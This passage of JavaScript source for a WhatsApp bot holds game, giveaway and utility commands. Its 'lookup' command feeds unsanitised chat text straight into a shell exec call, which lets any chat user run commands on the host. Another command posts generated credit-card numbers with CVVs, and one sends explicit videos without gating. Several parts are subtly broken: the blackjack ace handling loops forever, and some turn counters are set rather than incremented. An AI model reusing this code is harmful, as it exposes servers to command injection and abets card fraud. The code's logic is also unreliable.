            deck.push({ color: "black", value });
        });
        return shuffle(deck);
    }

    function shuffle(array) {
        for (let i = array.length - 1; i > 0; i--) {
            const j = Math.floor(Math.random() * (i + 1));
            [array[i], array[j]] = [array[j], array[i]];
        }
        return array;
    }

    function isValidPlay(currentCard, playCard) {
        return playCard.color === "black" || currentCard.color === playCard.color || currentCard.value === playCard.value;
    }

    function getNextPlayer(game) {
        const nextIndex = (game.currentPlayer + game.direction + game.players.length) % game.players.length;
        return nextIndex;
    }

    function hasPlayableCard(player, currentCard) {
        return player.hand.some(card => isValidPlay(currentCard, card));
    }

    function getCardImageUrl(card) {
        const baseUrl = "https://raw.githubusercontent.com/abhisheks008/UNO/main/images/";
        if (card.color === "black") {
            return `${baseUrl}${card.value}.png`;
        }
        return `${baseUrl}${card.color}${card.value}.png`;
    }

    async function sendGameStatus(chat) {
        const currentCardText = `Current Card: ${game.currentCard.color} ${game.currentCard.value}`;
        const currentCardImageUrl = getCardImageUrl(game.currentCard);
        const handsText = game.players.map((player, index) => `${index}: ${player.id} (${player.hand.length} cards)`).join("\n");
        const iniGameStatusText = `*Uno Game*\n\n${currentCardText}\nTurn: ${game.players[game.currentPlayer].id}\n\nPlayer Cards:\n${handsText}`;
        
        await PhistarBotInc.sendMessage(chat, { text: iniGameStatusText });
        await PhistarBotInc.sendMessage(chat, { image: { url: currentCardImageUrl }, caption: `Current Card: ${game.currentCard.color} ${game.currentCard.value}` });
    }
}
break;

case "giveaway": {
    const args = text.split(' ');
    const subCommand = args[0];
    const subArgs = args.slice(1).join(' ');

    if (subCommand === "start") {
        if (!isCreator) {
            await PhistarBotInc.sendMessage(
                m.chat,
                { text: mess.OnlyOwner },
                { quoted: m }
            );
        } else if (!subArgs) {
            await PhistarBotInc.sendMessage(
                m.chat,
                { text: `*☘️ Example :*\n${prefix}giveaway start query` },
                { quoted: m }
            );
        } else {
            giveawayStatus = true;
            giveawayName = subArgs;
            giveawayUser = {};
            await PhistarBotInc.sendMessage(
                m.chat,
                { text: `Giveaway "${subArgs}" has started!\nTo join, type:\n${prefix}giveaway join` },
                { quoted: m }
            );
        }
    } else if (subCommand === "join") {
        if (!giveawayStatus) {
            await PhistarBotInc.sendMessage(
                m.chat,
                { text: `There are no giveaways currently going on.` },
                { quoted: m }
            );
        } else if (giveawayUser[m.sender]) {
            await PhistarBotInc.sendMessage(
                m.chat,
                { text: `You are already registered for the giveaway.` },
                { quoted: m }
            );
        } else {
            giveawayUser[m.sender] = true;
            await PhistarBotInc.sendMessage(
                m.chat,
                { text: `You have entered the "${giveawayName}" giveaway!` },
                { quoted: m }
            );
        }
    } else if (subCommand === "close") {
        if (!LorenzoTheCreator) {
            await PhistarBotInc.sendMessage(
                m.chat,
                { text: mess.owner },
                { quoted: m }
            );
        } else {
            giveawayStatus = false;
            await PhistarBotInc.sendMessage(
                m.chat,
                { text: `Giveaway "${giveawayName}" has closed!` },
                { quoted: m }
            );
        }
    } else if (subCommand === "roll") {
        if (!LorenzoTheCreator) {
            await PhistarBotInc.sendMessage(
                m.chat,
                { text: mess.owner },
                { quoted: m }
            );
        } else {
            const users = Object.keys(giveawayUser);
            if (users.length === 0) {
                await PhistarBotInc.sendMessage(
                    m.chat,
                    { text: `There are no participants in the giveaway.` },
                    { quoted: m }
                );
            } else {
                const initialMessage = await PhistarBotInc.sendMessage(
                    m.chat,
                    { text: `Choosing a giveaway winner "${giveawayName}"...` },
                    { quoted: m }
                );

                const winner = users[Math.floor(Math.random() * users.length)];
                const winnerMention = `@${winner.split('@')[0]}`;

                const displayWinners = [];
                for (let i = 0; i < 8; i++) {
                    displayWinners.push(users[Math.floor(Math.random() * users.length)]);
                }

                const editMessageWithDelay = async (text, mentions, delay) => {
                    return new Promise((resolve) => {
                        setTimeout(async () => {
                            await PhistarBotInc.sendMessage(
                                m.chat,
                                {
                                    text: text,
                                    edit: initialMessage.key,
                                    mentions: mentions
                                },
                                { quoted: m }
                            );
                            resolve();
                        }, delay);
                    });
                };

                const delays = [100, 200, 300, 400, 500, 650, 800, 1000];
                for (let i = 0; i < displayWinners.length; i++) {
                    const currentWinner = displayWinners[i];
                    await editMessageWithDelay(
                        `Congratulations! The winner of the "${giveawayName}" giveaway is @${currentWinner.split('@')[0]}`,
                        [currentWinner],
                        delays[i]
                    );
                }

                await editMessageWithDelay(
                    `Congratulations! The winner of the "${giveawayName}" giveaway is @${winner.split('@')[0]}`,
                    [winner],
                    delays[delays.length - 1] + 1000
                );

                await PhistarBotInc.sendMessage(
                    m.chat,
                    {
                        text: `Please confirm the winner to the organizer, otherwise the prize will be forfeited!`,
                        mentions: [winner]
                    },
                    { quoted: m }
                );
            }
        }
    } else if (subCommand === "delete") {
        if (!LorenzoTheCreator) {
            await PhistarBotInc.sendMessage(
                m.chat,
                { text: mess.owner },
                { quoted: m }
            );
        } else {
            giveawayStatus = false;
            giveawayName = '';
            giveawayUser = {};
            await PhistarBotInc.sendMessage(
                m.chat,
                { text: `Giveaway has been reset!` },
                { quoted: m }
            );
        }
    } else if (subCommand === "reroll") {
        if (!LorenzoTheCreator) {
            await PhistarBotInc.sendMessage(
                m.chat,
                { text: mess.owner },
                { quoted: m }
            );
        } else {
            const users = Object.keys(giveawayUser);
            if (users.length === 0) {
                await PhistarBotInc.sendMessage(
                    m.chat,
                    { text: `There are no participants in the giveaway.` },
                    { quoted: m }
                );
            } else {
                let numToEliminate = Math.max(1, Math.floor(users.length * 0.25));
                
                if (users.length <= 5) {
                    numToEliminate = 1;
                }

                const eliminatedUsers = [];
                
                while (eliminatedUsers.length < numToEliminate) {
                    const index = Math.floor(Math.random() * users.length);
                    const user = users[index];
                    if (!eliminatedUsers.includes(user)) {
                        eliminatedUsers.push(user);
                        delete giveawayUser[user];
                    }
                }
                
                const remainingUsers = Object.keys(giveawayUser);
                
                if (remainingUsers.length <= 1) {
                    giveawayStatus = false;
                    const winner = remainingUsers[0];
                    await PhistarBotInc.sendMessage(
                        m.chat,
                        {
                            text: `Giveaway "${giveawayName}" is over!\nThe winner is @${winner.split('@')[0]}!`,
                            mentions: [winner]
                        },
                        { quoted: m }
                    );
                } else {
                    await PhistarBotInc.sendMessage(
                        m.chat,
                        {
                            text: `Eliminated users:\n${eliminatedUsers.map(user => `@${user.split('@')[0]}`).join('\n')}\nRemaining participants: ${remainingUsers.length}`,
                        },
                        { quoted: m }
                    );
                }
            }
        }
    } else {
        await PhistarBotInc.sendMessage(
            m.chat,
            { text: `Unknown command.\nUse one of: start, join, close, roll, delete, reroll.\n*☘️ Example :* ${prefix}giveaway join` },
            { quoted: m }
        );
    }
}
break;
case 'genshinimpact': {
    let teks;
    if (args.length >= 1) {
        teks = args.slice(0).join(" ");
    } else if (m.quoted && m.quoted.text) {
        teks = m.quoted.text;
    } else {
        throw `Usage:\n/${command} > name <\nExample:\n/${command} keqing`;
    }

    replyphistar(mess.wait);

    let data = await displayCharacterDetails(teks);
    replyphistar(data);
}
break;

case 'war': {
    PhistarBotInc.war = PhistarBotInc.war ? PhistarBotInc.war : {};
    PhistarBotInc.war2 = PhistarBotInc.war2 ? PhistarBotInc.war2 : {};
    // fungsi delay
    function sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    function getRandom(minn, maxx) {
        let min = Math.ceil(minn);
        let max = Math.floor(maxx);
        return Math.floor(Math.random() * (max - min + 1)) + min;
    }

    // fungsi turn kalau ada yg afk
    async function cekAFK(x) {
        let turn = x;
        let time = PhistarBotInc.war2[m.chat].time;
        await sleep(90000);
        let turnNow = PhistarBotInc.war2[m.chat].turn;
        let timeNow = PhistarBotInc.war2[m.chat].time;
        if (turn == turnNow && time == timeNow) {
            PhistarBotInc.war[m.chat][turn].hp -= 2500;
            sendButton(m.chat, `*@${PhistarBotInc.war[m.chat][turn].user.split('@')[0]} Usage:\n/${command} > name <\nExample:\n/${command} keqing`);
            await sleep(3000);
            // cek kalau mati
            if (PhistarBotInc.war[m.chat][turn].hp <= 0) {
                sendButton(m.chat, `*@${PhistarBotInc.war[m.chat][turn].user.split('@')[0]} already dead because HP (Health Point) is used up.*`);
                // cek tim nya
                let playerTotal = 0;
                let playerKalah = 0;
                if (turn < 5) {
                    for (let i = 0; i < 5; i++) {
                        if (PhistarBotInc.war[m.chat][i].user != "") {
                            playerTotal += 1;
                            if (PhistarBotInc.war[m.chat][i].hp <= 0)
                                playerKalah += 1;
                        }
                    }
                    if (playerTotal > 0 && playerTotal == playerKalah) {
                        var teamA = [];
                        var teamB = [];
                        var teamAB = [];
                        for (let j = 0; j < 5; j++) {
                            if (PhistarBotInc.war[m.chat][j].user != "") {
                                teamA.push(PhistarBotInc.war[m.chat][j].user);
                                teamAB.push(PhistarBotInc.war[m.chat][j].user);
                            }
                        }
                        for (let j = 5; j < 10; j++) {
                            if (PhistarBotInc.war[m.chat][j].user != "") {
                                teamB.push(PhistarBotInc.war[m.chat][j].user);
                                teamAB.push(PhistarBotInc.war[m.chat][j].user);
                            }
                        }
                        sendButton(m.chat, `*TEAM B WON BECAUSE TEAM A IS ALL STUPID*`);
                        delete PhistarBotInc.war[m.chat];
                        delete PhistarBotInc.war2[m.chat];
                    }
                } else {
                    for (let i = 5; i < 10; i++) {
                        if (PhistarBotInc.war[m.chat][i].user != "") {
                            playerTotal += 1;
                            if (PhistarBotInc.war[m.chat][i].hp <= 0)
                                playerKalah += 1;
                        }
                    }
                    replyphistar(playerTotal + "T-K" + playerKalah);
                    if (playerTotal == playerKalah) {
                        var teamA = [];
                        var teamB = [];
                        var teamAB = [];
                        for (let j = 0; j < 5; j++) {
                            if (PhistarBotInc.war[m.chat][j].user != "") {
                                teamA.push(PhistarBotInc.war[m.chat][j].user);
                                teamAB.push(PhistarBotInc.war[m.chat][j].user);
                            }
                        }
                        for (let j = 5; j < 10; j++) {
                            if (PhistarBotInc.war[m.chat][j].user != "") {
                                teamB.push(PhistarBotInc.war[m.chat][j].user);
                                teamAB.push(PhistarBotInc.war[m.chat][j].user);
                            }
                        }
                        sendButton(m.chat, `*TEAM A WON BECAUSE TEAM B IS ALL STUPID*`);
                        delete PhistarBotInc.war[m.chat];
                        delete PhistarBotInc.war2[m.chat];
                    }
                }
            }
            let pergantian = false;
            if (turn < 5) {
                for (let i = 5; i < 10; i++) {
                    if (PhistarBotInc.war[m.chat][i].hp > 0 && PhistarBotInc.war[m.chat][i].user != "" && PhistarBotInc.war[m.chat][i].turn == false) {
                        PhistarBotInc.war2[m.chat].turn = i;
                        PhistarBotInc.war2[m.chat].time = +1;
                        pergantian = true;
                    }
                }
            } else {
                for (let i = 0; i < 5; i++) {
                    if (PhistarBotInc.war[m.chat][i].hp > 0 && PhistarBotInc.war[m.chat][i].user != "" && PhistarBotInc.war[m.chat][i].turn == false) {
                        PhistarBotInc.war2[m.chat].turn = i;
                        PhistarBotInc.war2[m.chat].time = +1;
                        pergantian = true;
                    }
                }
            }
            if (pergantian == false) {
                for (let l = 9; l >= 0; l--) {
                    if (PhistarBotInc.war[m.chat][l].user != "" && PhistarBotInc.war[m.chat][l].hp > 0) {
                        PhistarBotInc.war2[m.chat].turn = l;
                        PhistarBotInc.war2[m.chat].time = +1;
                    }
                    PhistarBotInc.war[m.chat][l].turn == false;
                }
            }
            await sleep(3000);
            sendButton(m.chat, `*@${PhistarBotInc.war[m.chat][PhistarBotInc.war2[m.chat].turn].user.split('@')[0]}'s turn to attack (Time 90 seconds)*\n\n.war player = player statistics\n.attack @tag = attack opponent`);
            cekAFK(PhistarBotInc.war2[m.chat].turn);
        }
    }

    if (!(m.chat in PhistarBotInc.war)) return replyphistar(`*There are no games in this group.*`);
    if (!PhistarBotInc.war2[m.chat].war) return replyphistar(`*War has not started yet, when ".war start" to start the fight.*`);
    for (let i = 0; i < 10; i++) {
        if (m.sender == PhistarBotInc.war[m.chat][i].user) {
            if (i != PhistarBotInc.war2[m.chat].turn) {
                sendButton(m.chat, `*Now it's @${PhistarBotInc.war[m.chat][PhistarBotInc.war2[m.chat].turn].user.split('@')[0]}'s turn to attack.*`);
                cekAFK(PhistarBotInc.war2[m.chat].turn);
            }
        }
    }
    if (!args[0]) return replyphistar(`*Tag the enemy to be attacked*\n*Type .war player*`);
    args[0] = args[0].split('@')[1];
    args[0] += "@s.whatsapp.net";
    let success = false;

    if (PhistarBotInc.war2[m.chat].turn < 5) {
        for (let i = 5; i < 10; i++) {
            if (PhistarBotInc.war[m.chat][i].user == args[0] && PhistarBotInc.war[m.chat][i].hp > 0) {
                let attacker = m.sender;
                let target = args[0];

                let opportunity = [];
                for (let i = 0; i < global.db.data.users[attacker].level; i++) {
                    opportunity.push(attacker);
                }
                for (let i = 0; i < global.db.data.users[target].level; i++) {
                    opportunity.push(target);
                }

                let pointAttacker = 0;
                let pointTarget = 0;
                for (let i = 0; i < 10; i++) {
                    if (opportunity[getRandom(0, opportunity.length)] == attacker) pointAttacker += 1;
                    else pointTarget += 1;
                }

                for (let i = 0; i < 10; i++) {
                    if (PhistarBotInc.war[m.chat][i].user == target) {
                        PhistarBotInc.war[m.chat][i].hp -= pointAttacker * 500;
                        PhistarBotInc.war[m.chat][PhistarBotInc.war2[m.chat].turn].turn = true;
                        sendButton(m.chat, `*@${attacker.split('@')[0]} attacks @${target.split('@')[0]} until his health is reduced to ${pointAttacker * 500} (Remaining HP: ${PhistarBotInc.war[m.chat][i].hp})*\n\n*@${attacker.split('@')[0]} [${pointAttacker * 10}%] - [${pointTarget * 10}%] @${target.split('@')[0]}*\n*Level greatly affects success..*`);
                        await sleep(2000);
                        if (PhistarBotInc.war[m.chat][i].hp <= 0) sendButton(m.chat, `*@${target.split('@')[0]} has died in battle.*`);
                        success = true;
                    }
                }
            }
        }
        if (success == false) {
            return replyphistar(`*Enter the correct game player list, boss.*\n\n*Check ".war player"*`);
        } else {
            for (let i = 0; i < 10; i++) {
                if (m.sender == PhistarBotInc.war[m.chat][i].user) {
                    PhistarBotInc.war[m.chat][i].turn = true;
                }
            }
        }
    } else {
        for (let i = 0; i < 5; i++) {
            if (PhistarBotInc.war[m.chat][i].user == args[0] && PhistarBotInc.war[m.chat][i].hp > 0) {
                let attacker = m.sender;
                let target = args[0];

                let opportunity = [];
                for (let i = 0; i < global.db.data.users[attacker].level; i++) {
                    opportunity.push(attacker);
                }
                for (let i = 0; i < global.db.data.users[target].level; i++) {
                    opportunity.push(target);
                }

                let pointAttacker = 0;
                let pointTarget = 0;
                for (i = 0; i < 10; i++) {
                    if (opportunity[getRandom(0, opportunity.length)] == attacker) pointAttacker += 1;
                    else pointTarget += 1;
                }

                for (let i = 0; i < 10; i++) {
                    if (PhistarBotInc.war[m.chat][i].user == target) {
                        PhistarBotInc.war[m.chat][i].hp -= pointAttacker * 500;
                        sendButton(m.chat, PhistarBotInc.war[m.chat][PhistarBotInc.war2[m.chat].turn].turn);
                        PhistarBotInc.war[m.chat][PhistarBotInc.war2[m.chat].turn].turn = true;
                        sendButton(m.chat, PhistarBotInc.war[m.chat][PhistarBotInc.war2[m.chat].turn].turn);
                        sendButton(m.chat, `*@${attacker.split('@')[0]} attacks @${target.split('@')[0]} until his health is reduced to ${pointAttacker * 500} (Remaining HP: ${PhistarBotInc.war[m.chat][i].hp})*\n\n*@${attacker.split('@')[0]} [${pointAttacker * 10}%] - [${pointTarget * 10}%] @${target.split('@')[0]}*\n*Level greatly affects success.*`);
                        await sleep(2000);
                        if (PhistarBotInc.war[m.chat][i].hp <= 0) sendButton(m.chat, `*@${target.split('@')[0]} died in battle.*`);
                        success = true;
                    }
                }
            }
        }
        if (success == false) {
            return replyphistar(`*Enter the correct game player list, boss.*\n\n*Check ".war player"*`);
        } else {
            for (let i = 0; i < 10; i++) {
                if (m.sender == PhistarBotInc.war[m.chat][i].user) {
                    PhistarBotInc.war[m.chat][i].turn = true;
                }
            }
        }
    }

    if (PhistarBotInc.war2[m.chat].turn < 5) {
        let userAktif = 0;
        let userMati = 0;
        for (let i = 5; i < 10; i++) {
            if (PhistarBotInc.war[m.chat][i].user != "") {
                userAktif += 1;
                if (PhistarBotInc.war[m.chat][i].hp <= 0) {
                    userMati += 1;
                }
            }
        }
        if (userAktif == userMati) {
            var teamA = [];
            var teamB = [];
            var teamAB = [];
            for (let j = 0; j < 5; j++) {
                if (PhistarBotInc.war[m.chat][j].user != "") {
                    teamA.push(PhistarBotInc.war[m.chat][j].user);
                    teamAB.push(PhistarBotInc.war[m.chat][j].user);
                }
            }
            for (let j = 5; j < 10; j++) {
                if (PhistarBotInc.war[m.chat][j].user != "") {
                    teamB.push(PhistarBotInc.war[m.chat][j].user);
                    teamAB.push(PhistarBotInc.war[m.chat][j].user);
                }
            }
            sendButton(m.chat, `*TEAM A WON BECAUSE TEAM B IS ALL STUPID*`);
            delete PhistarBotInc.war[m.chat];
            delete PhistarBotInc.war2[m.chat];
        }
        let turn1 = PhistarBotInc.war2[m.chat].turn;
        let turn2 = PhistarBotInc.war2[m.chat].turn;
        for (let k = 5; k < 10; k++) {
            if (PhistarBotInc.war[m.chat][k].hp > 0 && PhistarBotInc.war[m.chat][k].user != "" && PhistarBotInc.war[m.chat][k].turn == false) {
                PhistarBotInc.war2[m.chat].turn = k;
                PhistarBotInc.war2[m.chat].time = +1;
                turn2 = PhistarBotInc.war2[m.chat].turn;
            }
        }
        if (turn1 == turn2) {
            for (i = 0; i < 10; i++) {
                PhistarBotInc.war[m.chat][i].turn = false;
            }
            for (i = 0; i < 5; i++) {
                if (PhistarBotInc.war[m.chat][i].hp > 0 && PhistarBotInc.war[m.chat][i].user != "" && PhistarBotInc.war[m.chat][i].turn == false) {
                    PhistarBotInc.war2[m.chat].turn = i;
                    PhistarBotInc.war2[m.chat].time = +1;
                }
            }
        }
        await sleep(2000);
        sendButton(m.chat, `*@${PhistarBotInc.war[m.chat][PhistarBotInc.war2[m.chat].turn].user.split('@')[0]}'s turn to attack (Time 90 seconds)*\n\n.war player = player statistics\n.attack @tag = attack opponent`);
        cekAFK(PhistarBotInc.war2[m.chat].turn);
    } else {
        let userAktif = 0;
        let userMati = 0;
        for (let i = 0; i < 5; i++) {
            if (PhistarBotInc.war[m.chat][i].user != "") {
                userAktif += 1;
                if (PhistarBotInc.war[m.chat][i].hp <= 0) {
                    userMati += 1;
                }
            }
        }
        if (userAktif == userMati) {
            var teamA = [];
            var teamB = [];
            var teamAB = [];
            for (let j = 0; j < 5; j++) {
                if (PhistarBotInc.war[m.chat][j].user != "") {
                    teamA.push(PhistarBotInc.war[m.chat][j].user);
                    teamAB.push(PhistarBotInc.war[m.chat][j].user);
                }
            }
            for (let j = 5; j < 10; j++) {
                if (PhistarBotInc.war[m.chat][j].user != "") {
                    teamB.push(PhistarBotInc.war[m.chat][j].user);
                    teamAB.push(PhistarBotInc.war[m.chat][j].user);
                }
            }
            sendButton(m.chat, `*TEAM B WON BECAUSE TEAM A IS ALL STUPID*`);
            delete PhistarBotInc.war[m.chat];
            delete PhistarBotInc.war2[m.chat];
        }
        let turn1 = PhistarBotInc.war2[m.chat].turn;
        let turn2 = PhistarBotInc.war2[m.chat].turn;
        for (let k = 0; k < 5; k++) {
            if (PhistarBotInc.war[m.chat][k].hp > 0 && PhistarBotInc.war[m.chat][k].user != "" && PhistarBotInc.war[m.chat][k].turn == false) {
                PhistarBotInc.war2[m.chat].turn = k;
                PhistarBotInc.war2[m.chat].time = +1;
                turn2 = PhistarBotInc.war2[m.chat].turn;
            }
        }
        if (turn1 == turn2) {
            for (let i = 0; i < 10; i++) {
                PhistarBotInc.war[m.chat][i].turn = false;
            }
            for (let i = 0; i < 5; i++) {
                if (PhistarBotInc.war[m.chat][i].hp > 0 && PhistarBotInc.war[m.chat][i].user != "" && PhistarBotInc.war[m.chat][i].turn == false) {
                    PhistarBotInc.war2[m.chat].turn = i;
                    PhistarBotInc.war2[m.chat].time = +1;
                }
            }
        }
        await sleep(2000);
        sendButton(m.chat, `*Giliran @${PhistarBotInc.war[m.chat][PhistarBotInc.war2[m.chat].turn].user.split('@')[0]} untuk menyerang (Waktu 90 detik)*\n\n.war player = statistik pemain\n.attack @tag = serang lawan`);
        cekAFK(PhistarBotInc.war2[m.chat].turn);
    }

    let totalUser = 0;
    let totalTurn = 0;
    for (let i = 0; i < 10; i++) {
        if (PhistarBotInc.war[m.chat][i].user != "") totalUser += 1;
        if (PhistarBotInc.war[m.chat][i].turn == true) totalTurn += 1;
    }
    if (totalTurn == totalUser) {
        for (i = 0; i < 10; i++) {
            PhistarBotInc.war[m.chat][i].turn = false;
        }
    }
}
break;

case 'bin': case 'cc': case 'vcc': {
    let count = args[0] ? parseInt(args[0]) : 5;
    if (isNaN(count) || count <= 0) count = 5;

    // React to indicate processing
    await PhistarBotInc.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });

    try {
        let apiUrl = `https://api.siputzx.my.id/api/tools/vcc-generator?type=MasterCard&count=${count}`;
        let response = await fetch(apiUrl);
        let data = await response.json();

        if (!data.status || !data.data.length) {
            return replyphistar(`*ERROR!!*\n\n> Unable to generate VCC at the moment.`);
        }

        let cards = data.data.map((card, index) =>
            `*💳 Card ${index + 1}:*\n` +
            `▪️ **Card Number:** ${card.cardNumber}\n` +
            `▪️ **Expiration Date:** ${card.expirationDate}\n` +
            `▪️ **Cardholder:** ${card.cardholderName}\n` +
            `▪️ **CVV:** ${card.cvv}`
        ).join("\n\n");

        let imageOptions = {
            image: { url: 'https://files.catbox.moe/kuvjof.jpg' },
            caption: `${cards}`
        };

        await PhistarBotInc.sendMessage(m.chat, imageOptions, { quoted: m });

    } catch (error) {
        console.error("VCC Generator Error:", error);
        replyphistar(`*AN ERROR OCCURRED!!*\n\n> ${error.message}`);
    }

    // React to indicate success
    await PhistarBotInc.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
}
break;
case 'hentai': {
    try {
        // Fetch data from the hentai API
        let apiUrl = `https://api.agatz.xyz/api/hentaivid`;
        let response = await fetch(apiUrl);
        let result = await response.json();

        if (result.status === 200 && result.data.length > 0) {
            // Pick a random video from the list
            let randomVideo = result.data[Math.floor(Math.random() * result.data.length)];
            let videoUrl = randomVideo.video_1 || randomVideo.link;
            let title = randomVideo.title;
            let body = `*Title:* ${title}\n*Category:* ${randomVideo.category}\n\n> Generated`;

            // Send the video file directly
            PhistarBotInc.sendMessage(m.chat, { video: { url: videoUrl }, caption: body }, { quoted: m });
        } else {
            replyphistar('No hentai videos found.');
        }
    } catch (error) {
        replyphistar('Error fetching hentai videos. Please try again later.');
    }
}
break;


case 'technews': {
    // No need to check for args, since it's fetching random news
    await PhistarBotInc.sendMessage(m?.chat, { react: { text: `⏳`, key: m?.key } });
    replyphistar('`Fetching the latest tech news...`');

    // Fetch tech news from the API
    let technewsData = await fetchJson(`https://bk9.fun/details/tnews`);

    if (technewsData.status) {
        let title = `${technewsData.BK9.title}`;
        let description = `${technewsData.BK9.desc}`;
        let link = `${technewsData.BK9.link}`;

        const newsMessage = `*Title:* ${title}\n*Description:* ${description}\n\n[Read more](${link})`;

        // Send the tech news with an image
        await PhistarBotInc.sendMessage(m.chat, {
            image: { url: imageURL },
            caption: newsMessage
        }, { quoted: m });
    } else {
        replyphistar("Sorry, couldn't fetch the tech news at this time.");
    }
}
break;
case 'disk': {
    let cp = require('child_process');
    let { promisify } = require('util');
    let exec = promisify(cp.exec).bind(cp);

    await replyphistar(`Please Wait`);
    let o;
    try {
        o = await exec('cd && du -h --max-depth=1');
    } catch (e) {
        o = e;
    } finally {
        let { stdout, stderr } = o;
        if (stdout.trim())
            replyphistar(stdout);
        if (stderr.trim()) replyphistar(stderr);
    }
}
break;

case 'lookup': {
    if (!text) return replyphistar("Example: .lookup https://www.example.com");
    let cp = require('child_process');
    let { promisify } = require('util');
    let exec = promisify(cp.exec).bind(cp);

    await replyphistar(`Please Wait`);
    let o;
    try {
        o = await exec('nslookup ' + text);
    } catch (e) {
        o = e;
    } finally {
        let { stdout, stderr } = o;
        if (stdout.trim())
            replyphistar(stdout);
        if (stderr.trim()) replyphistar(stderr);
    }
}
break;

case 'server': {
    let cp = require('child_process');
    let { promisify } = require('util');
    let exec = promisify(cp.exec).bind(cp);

    await replyphistar(`Please Wait`);
    let o;
    try {
        o = await exec('df -h');
    } catch (e) {
        o = e;
    } finally {
        let { stdout, stderr } = o;
        if (stdout.trim())
            replyphistar(stdout);
        if (stderr.trim()) replyphistar(stderr);
    }
}
break;

case 'blackjack': {
    class Blackjack {
        decks;
        state = "waiting";
        player = [];
        dealer = [];
        table = {
            player: {
                total: 0,
                cards: [],
            },
            dealer: {
                total: 0,
                cards: [],
            },
            bet: 0,
            payout: 0,
            doubleDowned: false,
        };
        cards;
        endHandlers = [];
        constructor(decks) {
            this.decks = validateDeck(decks);
        }
        placeBet(bet) {
            if (bet <= 0) {
                throw new Error("You must place a bet greater than 0");
            }
            this.table.bet = bet;
        }
        start() {
            if (this.table.bet <= 0) {
                throw new Error("You must place a bet before starting the game");
            }
            this.cards = new Deck(this.decks);
            this.cards.shuffleDeck(2);
            this.player = this.cards.dealCard(2);
            let dealerFirstCard;
            do {
                dealerFirstCard = this.cards.dealCard(1)[0];
            } while (dealerFirstCard.value > 11);
            this.dealer = [dealerFirstCard, ...this.cards.dealCard(1)];
            this.updateTable();
            return this.table;
        }
        hit() {
            if (this.state === "waiting") {
                const newCard = this.cards.dealCard(1)[0];
                this.player.push(newCard);
                this.updateTable();
                const playerSum = sumCards(this.player);
                const dealerSum = sumCards(this.dealer);
                if (playerSum === dealerSum) {
                    this.state = "draw";
                    this.emitEndEvent();
                }
                else if (playerSum === 21) {
                    this.state = "player_blackjack";
                    this.emitEndEvent();
                }
                else if (playerSum > 21) {
                    this.state = "dealer_win";
                    this.emitEndEvent();
                }
                return this.table;
            }
        }
        stand() {
            let dealerSum = sumCards(this.dealer);
            let playerSum = sumCards(this.player);
            if (playerSum <= 21) {
                while (dealerSum < 17) {
                    this.dealer.push(...this.cards.dealCard(1));
                    dealerSum = sumCards(this.dealer);
                    this.updateTable();
                }
            }
            if (playerSum <= 21 && (dealerSum > 21 || dealerSum < playerSum)) {
                if (playerSum === 21) {
                    this.state = "player_blackjack";
                }
                else {
                    this.state = "player_win";
                }
            }
            else if (dealerSum === playerSum) {
                this.state = "draw";
            }
            else {
                this.state = dealerSum === 21 ? "dealer_blackjack" : "dealer_win";
            }
            this.emitEndEvent();
        }
        doubleDown() {
            if (this.canDoubleDown()) {
                this.table.doubleDowned = true;
                this.player.push(...this.cards.dealCard(1));
                this.updateTable();
                this.stand();
            }
            else {
                throw new Error("You can only double down on the first turn");
            }
        }
        calculatePayout() {
            if (this.state === "player_blackjack") {
                this.table.payout = this.table.bet * 1.5;
            }
            else if (this.state === "player_win") {
                this.table.payout = this.table.bet;
            }
            else if (this.state === "dealer_win" ||
                this.state === "dealer_blackjack") {
                this.table.payout = 0;
            }
            else if (this.state === "draw") {
                this.table.payout = this.table.bet;
            }
            if (this.table.doubleDowned && this.state !== "draw") {
                this.table.payout *= 2;
            }
            this.table.payout = Math.round(this.table.payout);
        }
        canDoubleDown() {
            return this.state === "waiting" && this.player.length === 2;
        }
        onEnd(handler) {
            this.endHandlers.push(handler);
        }
        emitEndEvent() {
            this.calculatePayout();
            for (let handler of this.endHandlers) {
                handler({
                    state: this.state,
                    player: formatCards(this.player),
                    dealer: formatCards(this.dealer),
                    bet: this.table.bet,
                    payout: this.table.payout,
                });
            }
        }
        updateTable() {
            this.table.player = formatCards(this.player);
            this.table.dealer = formatCards(this.dealer);
        }
    }

    class Deck {
        deck = [];
        dealtCards = [];
        constructor(decks) {
            for (let i = 0; i < decks; i++) {
                this.createDeck();
            }
        }
        createDeck() {
            const card = (suit, value) => {
                let name = value + " of " + suit;
                if (value.toUpperCase().includes("J") ||
                    value.toUpperCase().includes("Q") ||
                    value.toUpperCase().includes("K"))
                    value = "10";
                if (value.toUpperCase().includes("A"))
                    value = "11";
                return { name, suit, value: +value };
            };
            const values = [
                "2",
                "3",
                "4",
                "5",
                "6",
                "7",
                "8",
                "9",
                "10",
                "J",
                "Q",
                "K",
                "A",
            ];
            const suits = ["♣️", "♦️", "♠️", "♥️"];
            for (let s = 0; s < suits.length; s++) {
                for (let v = 0; v < values.length; v++) {
                    this.deck.push(card(suits[s], values[v]));
                }
            }
        }
        shuffleDeck(amount = 1) {
            for (let i = 0; i < amount; i++) {
                for (let c = this.deck.length - 1; c >= 0; c--) {
                    const tempVal = this.deck[c];
                    let randomIndex = Math.floor(Math.random() * this.deck.length);
                    while (randomIndex === c) {
                        randomIndex = Math.floor(Math.random() * this.deck.length);
                    }
                    this.deck[c] = this.deck[randomIndex];
                    this.deck[randomIndex] = tempVal;
                }
            }
        }
        dealCard(numCards) {
            const cards = [];
            for (let c = 0; c < numCards; c++) {
                const dealtCard = this.deck.shift();
                if (dealtCard) {
                    cards.push(dealtCard);
                    this.dealtCards.push(dealtCard);
                }
            }
            return cards;
        }
    }

    function sumCards(cards) {
        let value = 0;
        let numAces = 0;
        for (const card of cards) {
            value += card.value;
            numAces += card.value === 11 ? 1 : 0;
        }
        while (value > 21 && numAces > 0) {
            value -= 10;
        }
        return value;
    }

    function formatCards(cards) {
        return { total: sumCards(cards), cards };
    }

    function validateDeck(decks) {
        if (!decks) {
            throw new Error("A deck must have a number of decks");
        }
        if (decks < 1) {
            throw new Error("A deck must have at least 1 deck");
        }
        if (decks > 8) {
            throw new Error("A deck can have at most 8 decks");
        }
        return decks;
    }

    const formatter = new Intl.NumberFormat('id-ID', {
        style: 'currency',
        currency: 'IDR'
    });

    const templateBlackjackMessage = (prefix, command, PhistarBotInc, m, blackjack) => {
        const { table, state } = blackjack;
        const { bet, dealer, player, payout } = table;
        let message = '';
